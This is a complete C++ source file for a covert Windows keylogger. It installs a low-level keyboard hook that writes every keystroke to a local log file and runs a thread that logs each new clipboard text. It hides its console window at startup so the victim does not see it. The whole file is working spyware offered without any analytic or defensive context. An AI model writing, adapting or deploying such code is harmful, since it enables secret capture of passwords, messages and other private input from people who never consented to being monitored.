#include <iostream>
#include <fstream>
#include <windows.h>
#include <thread>
#include <chrono>
#include <string>
#include <sstream>

// Global variables
std::ofstream logFile("log.txt", std::ios::out | std::ios::trunc);

// Function to check key states
static bool isShiftPressed() { return (GetKeyState(VK_SHIFT) & 0x8000) != 0; }
static bool isCtrlPressed() { return (GetKeyState(VK_CONTROL) & 0x8000) != 0; }
static bool isAltPressed() { return (GetKeyState(VK_MENU) & 0x8000) != 0; }
static bool isNumLockOn() { return (GetKeyState(VK_NUMLOCK) & 0x1) != 0; }

// Function to convert the virtual key code to a readable string
static std::string keyToString(DWORD keyCode) {
    char keyBuffer[5] = { 0 };

    if ((keyCode >= 0x41 && keyCode <= 0x5A)) { // Alphabet keys
        if (isShiftPressed() ^ ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)) {
            keyBuffer[0] = static_cast<char>(keyCode);
        }
        else {
            keyBuffer[0] = static_cast<char>(tolower(keyCode));
        }
        return std::string(keyBuffer);
    }

    static const char* nums = "0123456789";
    static const char* specialNums = ")!@#$%^&*(";
    if (keyCode >= 0x30 && keyCode <= 0x39) {
        return std::string(1, isShiftPressed() ? specialNums[keyCode - 0x30] : nums[keyCode - 0x30]);
    }

    switch (keyCode) {
    case VK_NUMPAD0: return "0";
    case VK_NUMPAD1: return "1";
    case VK_NUMPAD2: return "2";
    case VK_NUMPAD3: return "3";
    case VK_NUMPAD4: return "4";
    case VK_NUMPAD5: return "5";
    case VK_NUMPAD6: return "6";
    case VK_NUMPAD7: return "7";
    case VK_NUMPAD8: return "8";
    case VK_NUMPAD9: return "9";
    case VK_DECIMAL: return ".";
    case VK_DIVIDE: return "/";
    case VK_MULTIPLY: return "*";
    case VK_SUBTRACT: return "-";
    case VK_ADD: return "+";
    case VK_OEM_1: return isShiftPressed() ? ":" : ";";
    case VK_OEM_PLUS: return isShiftPressed() ? "+" : "=";
    case VK_OEM_COMMA: return isShiftPressed() ? "<" : ",";
    case VK_OEM_MINUS: return isShiftPressed() ? "_" : "-";
    case VK_OEM_PERIOD: return isShiftPressed() ? ">" : ".";
    case VK_OEM_2: return isShiftPressed() ? "?" : "/";
    case VK_OEM_3: return isShiftPressed() ? "~" : "`";
    case VK_OEM_4: return isShiftPressed() ? "{" : "[";
    case VK_OEM_5: return isShiftPressed() ? "|" : "\\";
    case VK_OEM_6: return isShiftPressed() ? "}" : "]";
    case VK_OEM_7: return isShiftPressed() ? "\"" : "'";
    case VK_SPACE: return "[SPACE]";
    case VK_RETURN: return "[ENTER]";
    case VK_BACK: return "[BACKSPACE]";
    case VK_TAB: return "[TAB]";
    case VK_ESCAPE: return "[ESC]";
    case VK_CAPITAL: return "[CAPS LOCK]";
    case VK_LSHIFT: return "[LEFT SHIFT]";
    case VK_RSHIFT: return "[RIGHT SHIFT]";
    case VK_LCONTROL: return "[LEFT CTRL]";
    case VK_RCONTROL: return "[RIGHT CTRL]";
    case VK_LMENU: return "[LEFT ALT]";
    case VK_RMENU: return "[RIGHT ALT]";
    case VK_F1:  return "[F1]";
    case VK_F2:  return "[F2]";
    case VK_F3:  return "[F3]";
    case VK_F4:  return "[F4]";
    case VK_F5:  return "[F5]";
    case VK_F6:  return "[F6]";
    case VK_F7:  return "[F7]";
    case VK_F8:  return "[F8]";
    case VK_F9:  return "[F9]";
    case VK_F10:  return "[F10]";
    case VK_F11:  return "[F11]";
    case VK_F12:  return "[F12]";
    case VK_NUMLOCK: return "[NUM-LOCK]";
    case VK_SCROLL:  return "[SCROLL-LOCK]";
    case VK_CLEAR:   return "[CLEAR]";
    case VK_SHIFT:   return "[SHIFT]";
    case VK_CONTROL: return "[CTRL]";
    case VK_MENU:    return "[ALT]";
    case VK_PAUSE:   return "[PAUSE]";
    case VK_PRIOR:   return "[PAGEUP]";
    case VK_NEXT:    return "[PAGEDOWN]";
    case VK_END:     return "[END]";
    case VK_HOME:    return "[HOME]";
    case VK_LEFT:    return "[LEFT]";
    case VK_UP:      return "[UP]";
    case VK_RIGHT:   return "[RIGHT]";
    case VK_DOWN:    return "[DOWN]";
    case VK_SELECT:  return "[SELECT]";
    case VK_PRINT:   return "[PRINT]";
    case VK_SNAPSHOT: return "[PRTSCRN]";
    case VK_INSERT:  return "[INS]";
    case VK_DELETE:  return "[DEL]";
    case VK_HELP:    return "[HELP]";
    case VK_LWIN:     return "[WIN]";
    case VK_RWIN:     return "[WIN]";

    default: return "[UNKNOWN]";
    }
}

// Callback function to handle keyboard events
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        PKBDLLHOOKSTRUCT p = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::string keyStr = keyToString(p->vkCode);
            std::cout << keyStr;
            logFile << keyStr;
            logFile.flush(); // Ensure data is written to disk immediately
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Function to get data from clipboard and log its content
std::string GetClipboardText() {
    if (!OpenClipboard(nullptr)) return "";
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (!hData) {
        CloseClipboard();
        return "";
    }
    char* pszText = static_cast<char*>(GlobalLock(hData));
    std::string text = pszText ? pszText : "";
    GlobalUnlock(hData);
    CloseClipboard();
    return text;
}

// Function to monitor clipboard for changes
void MonitorClipboard() {
    std::string lastClipText = "";
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        std::string currentText = GetClipboardText();
        if (!currentText.empty() && currentText != lastClipText) {
            std::cout << "Clipboard: " << currentText << std::endl;
            logFile << "Clipboard: " << currentText << std::endl;
            logFile.flush();
            lastClipText = currentText;
        }
    }
}

// Function to hide the console window
void HideConsole() {
    HWND hWnd = GetConsoleWindow();
    if (hWnd != NULL) {
        ShowWindow(hWnd, SW_HIDE);
    }
}

// Main function to set up the hook and run message loop
int main() {
    // Hide the console window at the start of the program
    HideConsole();

    std::thread clipboardThread(MonitorClipboard);
    clipboardThread.detach();

    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!keyboardHook) {
        std::cerr << "Failed to set keyboard hook!" << std::endl;
        return -1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    //cleanup
    UnhookWindowsHookEx(keyboardHook);
    logFile.close();
    return 0;
}
